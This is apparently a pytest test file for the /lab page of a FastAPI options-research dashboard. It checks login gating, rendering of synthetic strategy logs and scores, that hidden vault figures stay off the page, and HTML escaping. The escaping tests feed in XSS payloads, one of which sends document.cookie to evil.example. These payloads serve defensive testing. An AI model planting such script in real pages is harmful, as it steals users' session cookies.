"""卡 L5：网页 /lab（期权研究室）。空状态、合成日志的完整页面、playbook 转义、金库不露数字。
沿用 tests/test_web.py 的写法：临时目录 + TestClient + 登录。"""
import importlib
import json
import shutil
import time
from pathlib import Path

import pytest
from fastapi.testclient import TestClient

from desk import arena, config

ROOT = Path(__file__).resolve().parent.parent
PW = "correct horse battery"
HASH_OK = "a1b2c3d4e5f60718"
HASH_BAD = "0f0e0d0c0b0a0908"
HASH_VAULT = "77aa88bb99cc00dd"


@pytest.fixture
def env(tmp_path, monkeypatch):
    for f in ("config.toml", "events.toml"):
        shutil.copy(ROOT / f, tmp_path / f)
    monkeypatch.setenv("DESK_ROOT", str(tmp_path))
    monkeypatch.setenv("DESK_DATA", str(tmp_path / "data"))
    monkeypatch.setenv("WEB_INSECURE", "1")
    monkeypatch.setenv("WEB_SECRET", "x" * 32)
    s = config.load(tmp_path)
    import desk.web as web
    web = importlib.reload(web)
    web.add_user(s, "kea", PW)
    return s, web


def login(web):
    c = TestClient(web.app)
    assert c.post("/login", data={"username": "kea", "password": PW}, follow_redirects=False).status_code == 303
    return c


def norm(name_val=1.2, unds=("SPY",)):
    """规范化方案（字段和 options_lab._validate 的输出一致，够 brief_spec 用）。"""
    return {"v": 1, "underlyings": list(unds), "structure": "put_credit_spread", "kind": "credit", "dte": 30,
            "legs": [{"side": "sell", "type": "put", "strike_pct": 0.95}, {"side": "buy", "type": "put", "strike_pct": 0.9}],
            "conditions": [{"name": "iv_rv_ge", "value": name_val}],
            "exit": {"mode": "hold", "exit_dte": 7, "take_profit": 0.5, "stop_loss": 2.0, "max_hold_days": 25},
            "cooldown_days": 1}


def dev(n=25, clusters=12, prob=0.9731, crash=(-412.0, 88.0)):
    return {"n_trades": n, "n_clusters": clusters, "total_pnl": 1234.5, "dsr": 1.9, "dsr_prob": prob, "boot_p": 0.04,
            "overlap": {"2024-08-01..2024-08-16": crash[0], "2025-04-01..2025-04-30": crash[1]},
            "worst_trade": {"pnl": -310.0}, "data_incomplete": False, "n_trials": 61}


def write_jsonl(path: Path, rows):
    path.parent.mkdir(parents=True, exist_ok=True)
    with open(path, "a", encoding="utf-8") as f:
        for r in rows:
            f.write(json.dumps(r, ensure_ascii=False) + "\n")


def proposal_rows(s):
    """一条有效+已打分、一条无效、一条样本太少、一条重复。"""
    lab = Path(s.data) / "lab"
    rows = [
        {"who": "LAB_SELL", "ts": "2026-10-24T14:30:00+00:00", "hash": HASH_OK, "spec": norm(), "why": "vol risk premium",
         "valid": True, "reason": "", "duplicate_of": None, "backtested": True, "dev": dev(), "weekly": [0.0] * 3,
         "status": "scored", "points": 1.5, "points_reason": "z 1.90 比当前最好高 0.40"},
        {"who": "LAB_BUY", "ts": "2026-10-24T14:31:00+00:00", "hash": HASH_BAD, "spec": None, "why": "x",
         "valid": False, "reason": "naked_short: sold 1 put(s) but only 0 bought", "duplicate_of": None, "backtested": False,
         "dev": None, "weekly": None, "status": "invalid", "points": -1.0,
         "points_reason": "invalid: naked_short: sold 1 put(s) but only 0 bought"},
        {"who": "LAB_EVENT", "ts": "2026-10-24T14:32:00+00:00", "hash": "1111222233334444", "spec": norm(1.5, ("NVDA",)), "why": "y",
         "valid": True, "reason": "", "duplicate_of": None, "backtested": True, "dev": dev(n=6, clusters=3, prob=None),
         "weekly": [0.0] * 3, "status": "ineligible", "points": 0.0, "points_reason": "样本太少"},
        {"who": "LAB_BUY", "ts": "2026-10-24T14:33:00+00:00", "hash": HASH_OK, "spec": norm(), "why": "z",
         "valid": True, "reason": "", "duplicate_of": {"who": "LAB_SELL", "ts": "2026-10-24T14:30:00+00:00"},
         "reason": "duplicate of an already-tested spec", "backtested": False, "dev": None, "weekly": None,
         "status": "duplicate", "points": -1.0, "points_reason": "duplicate: not run, -1"},
    ]
    write_jsonl(lab / "log.jsonl", rows)


def score_rows(s):
    arena.add_score(s, "LAB_SELL", "lab_dev", 1.5, "dev scored", ref=HASH_OK)
    arena.add_score(s, "LAB_BUY", "lab_dev", -1.0, "invalid", ref=HASH_BAD)
    arena.add_score(s, "LAB_SKEPTIC", "lab_critic", 0.5, "predicted right", ref=HASH_OK)


def test_requires_login(env):
    s, web = env
    c = TestClient(web.app)
    assert c.get("/lab", follow_redirects=False).status_code == 303


def test_nav_link_present(env):
    s, web = env
    c = login(web)
    r = c.get("/lab")
    assert r.status_code == 200
    assert 'href="/lab"' in r.text and "期权研究室" in r.text
    assert 'href="/agents"' in r.text and 'href="/labs"' in r.text


def test_empty_state(env):
    s, web = env
    c = login(web)
    r = c.get("/lab")
    assert r.status_code == 200
    assert "研究室还没跑过第一轮" in r.text
    assert "诚实限制" in r.text and "开发段只有 18 个月" in r.text     # §7 的三条始终在最上面
    assert '<div class="v s">60</div>' in r.text                      # 种子：v1 32 + v2 28
    assert "Traceback" not in r.text and "读取失败" not in r.text


def test_populated_from_synthetic_log(env):
    s, web = env
    proposal_rows(s)
    score_rows(s)
    arena.set_playbook(s, "LAB_SELL", "卖波动派：put 信用价差在 IV/RV 高时有效，尾部靠封顶腿守住。")
    c = login(web)
    r = c.get("/lab")
    assert r.status_code == 200
    t = r.text
    assert "研究室还没跑过第一轮" not in t
    # 1. 顶部：诚实限制 + 全局试验次数
    assert t.index("诚实限制") < t.index("赛道排行") < t.index("研究日志")
    assert '<div class="v s">60</div>' in t
    # 2. 赛道排行：名字、立场、代数、30 天积分、冠军；两个评委
    assert "卖波动派" in t and "第 1 代" in t and "+1.5" in t
    assert "冠军" in t
    assert "怀疑派" in t and "+0.5" in t
    assert "评委" in t
    # 3. 研究日志：方案结构摘要、状态（中文）、开发段笔数、置信度、暴跌窗口、得分、原因
    assert "put_credit_spread" in t and "SPY" in t and "iv_rv_ge=1.2" in t
    assert "有效" in t and "无效" in t and "重复" in t and "样本太少" in t
    assert "97.3%" in t
    assert "2024-08-01..2024-08-16 -412" in t
    assert "naked_short" in t and "z 1.90 比当前最好高 0.40" in t
    # 5. 每个 racer 的 playbook
    assert "put 信用价差在 IV/RV 高时有效" in t
    # 研究日志按时间倒序（页面上是加州时间：UTC 14:33 = PT 07:33），最新的在最上面
    assert t.index("10-24 07:33") < t.index("10-24 07:30")


def test_vault_shows_only_hash_date_and_verdict(env):
    s, web = env
    proposal_rows(s)
    write_jsonl(Path(s.data) / "lab" / "vault.jsonl", [
        {"hash": HASH_VAULT, "who": "LAB_BUY", "ts": "2026-10-20T15:00:00+00:00", "iso_week": "2026-W43", "passed": True,
         "complete": True, "n_trials": 61, "bonferroni": 0.00083, "bonferroni_ok": False, "spec": norm(),
         "eval": {"test": {"total_pnl": 7316.9183, "trades": 31, "win_rate": 0.4417}, "test_week_boot_p": 0.0271,
                  "crit_test_pnl_positive": True, "worst_trade": -8123.4567}},
        {"hash": "ffff0000eeee1111", "who": "LAB_SELL", "ts": "2026-10-21T15:00:00+00:00", "iso_week": "2026-W43", "passed": False,
         "vault_error": True, "error": "KeyError: 5566.7711"},
    ])
    c = login(web)
    t = c.get("/lab").text
    # 金库段：哈希、日期、过 / 没过（出错的显示出错）
    assert HASH_VAULT in t and "2026-10-20" in t
    assert '<td class="good">过</td>' in t and '<td class="bad">出错</td>' in t
    assert "data/reports" in t and "lab_vault_" in t
    # 金库的数字一个都不能出现在页面上
    for secret in ("7316.9183", "7316", "8123.4567", "0.0271", "0.00083", "0.4417", "5566.7711", "5566"):
        assert secret not in t, secret


def test_html_escape_of_agent_text(env):
    s, web = env
    proposal_rows(s)
    evil = '<script>alert("pwn")</script><img src=x onerror=alert(1)>'
    arena.set_playbook(s, "LAB_BUY", evil)
    write_jsonl(Path(s.data) / "lab" / "log.jsonl", [
        {"who": "LAB_BUY", "ts": "2026-10-24T15:00:00+00:00", "hash": "9999888877776666", "spec": None, "why": evil,
         "valid": False, "reason": evil, "duplicate_of": None, "backtested": False, "dev": None, "weekly": None,
         "status": "invalid", "points": -1.0, "points_reason": evil}])
    c = login(web)
    r = c.get("/lab")
    assert r.status_code == 200
    assert "<script>alert" not in r.text and "<img src=x" not in r.text
    assert "&lt;script&gt;alert(&quot;pwn&quot;)&lt;/script&gt;" in r.text
    assert "&lt;img src=x onerror=alert(1)&gt;" in r.text


def test_malicious_playbook_is_escaped_and_capped(env):
    s, web = env
    proposal_rows(s)
    prefix = "<script>location='https://evil.example/?c='+document.cookie</script>"
    evil = prefix + "A" * 400
    arena.set_playbook(s, "LAB_SELL", evil)           # set_playbook 已截到 300 字
    keep = 300 - len(prefix)                          # 截断后剩下的 A 的个数
    c = login(web)
    t = c.get("/lab").text
    assert "<script>location" not in t
    assert "&lt;script&gt;location=" in t
    assert "A" * keep in t and "A" * (keep + 1) not in t
